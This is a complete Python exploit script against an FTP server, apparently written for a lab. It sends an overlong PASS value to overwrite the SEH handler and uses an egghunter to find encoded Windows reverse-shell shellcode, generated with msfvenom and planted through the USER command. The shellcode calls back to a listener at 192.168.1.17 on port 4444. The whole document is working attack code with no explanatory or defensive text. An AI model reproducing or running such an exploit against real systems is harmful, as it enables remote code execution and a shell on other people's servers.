import socket,sys

host = "192.168.1.10"
port= 21

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.17 LPORT=4444 -f c -v shell -b '\x0a\x0d' -e x86/shikata_ga_nai
shell = ("\xda\xc6\xd9\x74\x24\xf4\xbf\x92\x9d\x35\x91\x58\x2b\xc9\xb1\x52\x31\x78\x17\x03\x78\x17\x83\x52\x99\xd7\x64\xae\x4a\x95\x87\x4e\x8b\xfa\x0e\xab\xba\x3a\x74\xb8\xed\x8a\xfe\xec\x01\x60\x52\x04\x91\x04\x7b\x2b\x12\xa2\x5d\x02\xa3\x9f\x9e\x05\x27\xe2\xf2\xe5\x16\x2d\x07\xe4\x5f\x50\xea\xb4\x08\x1e\x59\x28\x3c\x6a\x62\xc3\x0e\x7a\xe2\x30\xc6\x7d\xc3\xe7\x5c\x24\xc3\x06\xb0\x5c\x4a\x10\xd5\x59\x04\xab\x2d\x15\x97\x7d\x7c\xd6\x34\x40\xb0\x25\x44\x85\x77\xd6\x33\xff\x8b\x6b\x44\xc4\xf6\xb7\xc1\xde\x51\x33\x71\x3a\x63\x90\xe4\xc9\x6f\x5d\x62\x95\x73\x60\xa7\xae\x88\xe9\x46\x60\x19\xa9\x6c\xa4\x41\x69\x0c\xfd\x2f\xdc\x31\x1d\x90\x81\x97\x56\x3d\xd5\xa5\x35\x2a\x1a\x84\xc5\xaa\x34\x9f\xb6\x98\x9b\x0b\x50\x91\x54\x92\xa7\xd6\x4e\x62\x37\x29\x71\x93\x1e\xee\x25\xc3\x08\xc7\x45\x88\xc8\xe8\x93\x1f\x98\x46\x4c\xe0\x48\x27\x3c\x88\x82\xa8\x63\xa8\xad\x62\x0c\x43\x54\xe5\xf3\x3c\x57\xe4\x9b\x3e\x57\x17\x00\xb6\xb1\x7d\xa8\x9e\x6a\xea\x51\xbb\xe0\x8b\x9e\x11\x8d\x8c\x15\x96\x72\x42\xde\xd3\x60\x33\x2e\xae\xda\x92\x31\x04\x72\x78\xa3\xc3\x82\xf7\xd8\x5b\xd5\x50\x2e\x92\xb3\x4c\x09\x0c\xa1\x8c\xcf\x77\x61\x4b\x2c\x79\x68\x1e\x08\x5d\x7a\xe6\x91\xd9\x2e\xb6\xc7\xb7\x98\x70\xbe\x79\x72\x2b\x6d\xd0\x12\xaa\x5d\xe3\x64\xb3\x8b\x95\x88\x02\x62\xe0\xb7\xab\xe2\xe4\xc0\xd1\x92\x0b\x1b\x52\xa2\x41\x01\xf3\x2b\x0c\xd0\x41\x36\xaf\x0f\x85\x4f\x2c\xa5\x76\xb4\x2c\xcc\x73\xf0\xea\x3d\x0e\x69\x9f\x41\xbd\x8a\x8a")

egg = "USER "+"kalikali"+shell +"\r\n";

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x6b\x61\x6c\x69\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

offset = "A" * (801-4-len(egghunter)) + egghunter
nseh = "\x90\x90\xeb\x80" #jmp 128 byte
seh = "\x26\x42\x41\x00" #00414226 pop pop ret

buffer = offset + nseh + seh


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
s2 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s2.connect((host,port))
s2.recv(1024)
s2.send(egg)
s.recv(1024)
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS "+buffer+"\r\n")
s.close()
